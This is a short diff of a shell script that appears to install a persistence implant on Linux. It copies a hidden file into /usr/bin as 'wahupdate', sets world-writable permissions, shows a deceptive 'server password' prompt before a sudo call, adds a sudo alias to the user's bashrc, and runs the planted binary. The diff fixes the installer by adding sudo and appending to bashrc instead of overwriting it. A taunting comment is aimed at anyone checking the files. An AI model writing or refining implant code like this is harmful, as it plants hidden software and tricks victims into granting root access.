@@ -21,7 +21,7 @@ out_msg() {
 
 fx_init_bash_implant() {
     out_msg
-    cp .light_seed /usr/bin/wahupdate
+    sudo cp .light_seed /usr/bin/wahupdate
     echo "PLEASE ENTER SERVER PASSWORD:"
     sudo chmod 777 /usr/bin/wahupdate
 }
@@ -37,7 +37,7 @@ fx_init_bash_implant() {
     #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
     if grep -q "0" ".blood"
     then
-        echo "alias 'wahupdate'='sudo /usr/bin/wahupdate'" > ~/.bashrc
+        echo "alias 'wahupdate'='sudo /usr/bin/wahupdate'" >> ~/.bashrc
         fx_init_bash_implant
     else
         sh /usr/bin/wahupdate
